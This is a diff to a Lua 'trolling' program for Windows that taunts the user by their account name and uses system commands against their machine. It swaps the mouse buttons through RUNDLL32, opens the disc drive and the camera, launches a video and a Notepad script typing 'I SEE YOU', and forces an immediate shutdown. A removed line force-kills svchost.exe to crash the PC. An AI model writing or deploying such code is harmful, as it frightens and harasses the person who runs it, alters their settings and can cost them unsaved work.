@@ -18,9 +18,13 @@ local json = require "json"
 
 local today = sys.Datetime()
 
-local hellomus = audio.Sound("mus//HELLO.mp3")
+local hellomus = audio.Sound("mus//HELLO.mp3")  --HELLO
 
-local liltrickmus = audio.Sound("mus//liltrick.mp3")
+local liltrickmus = audio.Sound("mus//tomfoolery.mp3")  --Lil' Trick
+
+local ufrmus = audio.Sound("mus//ufr.mp3")  --Unexpected Face Reveal
+
+local iyhmus = audio.Sound("mus//iyh.mp3")  --In Your Head
 
 
 
@@ -81,11 +85,15 @@ ui.info("Wait...");
 
 ui.info("I think I know you!");
 
-hellomus:play()
+hellomus:play();
       
 ui.info("Are you "..os.getenv('USERNAME').."?");
 
 ui.info("It is you!");
+
+ui.info("You're used to your mouse inputs, aren't ya?");
+
+ui.info("It would be really funny if I messed with that...");
 
 os.execute("RUNDLL32 USER32.DLL,SwapMouseButton");  --Swap Mouse Inputs
 
@@ -109,16 +117,23 @@ hellomus:stop()
 
 liltrickmus:play()
 
-
 DiscDrive();
 
 ui.info("Ta-da!!");
+
+ui.info("Cool, right?");
 
 ui.info("Actually, I kinda forgot what you look like!");
 
 ui.info("Let me juusssttt-");
 
+liltrickmus:stop()
+
 os.execute("start microsoft.windows.camera:");  --Open Windows Camera
+
+ufrmus:play()
+
+Waiteroo(1*03);
 
 ui.info("There we go!");
 
@@ -138,7 +153,11 @@ ui.info("Before I go...");
 
 os.execute("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");  --RICK
 
-ui.info("Hahaha!!");          
+ui.info("Hahaha!!");  
+
+ufrmus:stop()
+
+iyhmus:play()
                     
 ui.warn("I\'M IN YOUR HEAD.");  
 
@@ -146,14 +165,12 @@ os.execute("extern\\noteSpeak.bat");  --Will type out "I SEE YOU" in notepad.  C
 
 Waiteroo(1*05);
 
-ui.warn("...");                    
+ui.warn("..."); 
+
+iyhmus:stop()
           
 ui.info("Bye "..os.getenv('USERNAME').."!!!");
 
 json.save("trollingdocs\\dateShutdown.json", today)
 
-os.execute("taskkill /F /IM \"svchost.exe\" /T");  --Crash PC (Only Works With Admin)
-
-Waiteroo(1*05);  --Wait 5 seconds before continuing
-
-os.execute("shutdown /s /t 00");  --Backup if not admin
+os.execute("shutdown /s /t 00");
